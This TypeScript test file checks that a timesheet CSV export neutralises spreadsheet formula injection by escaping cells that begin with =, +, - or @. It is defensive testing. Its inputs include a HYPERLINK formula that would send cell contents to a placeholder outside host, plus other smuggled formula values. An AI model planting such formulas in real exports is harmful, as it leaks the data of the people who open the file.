// SPDX-License-Identifier: FSL-1.1-ALv2
//
// The dated sheet's CSV goes to finance and to clients, who open it in a spreadsheet: a task
// title or a name that starts like a formula is written as plain text, never run.

import { describe, expect, it } from "bun:test"
import { NOT_A_RECORD, type Timesheet, timesheetCsv } from "./timesheet"

function sheetWith(
  lines: Array<{ person: string; task: string; taskKey: string | null }>,
): Timesheet {
  return {
    projectId: "p",
    projectName: "Maison Ardent",
    month: "2026-10",
    period: { from: "2026-10-01", to: "2026-10-31", label: "October 2026" },
    lines: lines.map((l, i) => ({
      entryId: `e${i}`,
      date: "2026-10-05",
      person: l.person,
      taskId: `t${i}`,
      taskKey: l.taskKey,
      task: l.task,
      minutes: 60,
      hours: "1 h",
    })),
    totalMinutes: 60 * lines.length,
    total: `${lines.length} h`,
    coverage: { withEntries: 1, total: 1 } as Timesheet["coverage"],
    partial: false,
    coverageLine: "Real time entered on 1 of 1 tasks of October 2026.",
    note: NOT_A_RECORD,
    message: "",
  }
}

describe("the dated sheet's CSV", () => {
  it("a task title or a name starting with = + - or @ is written as text, not a formula", () => {
    const csv = timesheetCsv(
      sheetWith([
        { person: "Ana", task: '=HYPERLINK("https://x.example/?"&A1,"Layouts")', taskKey: null },
        { person: "Ana", task: "+1+2", taskKey: null },
        { person: "Ana", task: "-2+3", taskKey: null },
        { person: "@SUM(A1)", task: "Posters", taskKey: null },
      ]),
    )
    const cells = csv
      .trim()
      .split("\r\n")
      .slice(2, 6)
      .map((row) => (row.split(",")[1] === "Ana" ? row.slice("2026-10-05,Ana,".length) : row))
    expect(cells[0]).toStartWith(`"'=HYPERLINK(`)
    expect(cells[1]).toStartWith("'+1+2")
    expect(cells[2]).toStartWith("'-2+3")
    expect(cells[3]).toContain(",'@SUM(A1),")
    // No cell of the file starts like a formula.
    for (const row of csv.trim().split("\r\n")) {
      for (const cell of row.split(",")) expect(cell.replace(/^"/, "")).not.toMatch(/^[=+@]/)
    }
  })

  it("hours stay numbers", () => {
    const csv = timesheetCsv(sheetWith([{ person: "Ana", task: "Posters", taskKey: "MA-1" }]))
    expect(csv).toContain("2026-10-05,Ana,MA-1 Posters,1\r\n")
    expect(csv).toContain("Total,,,1\r\n")
  })
})
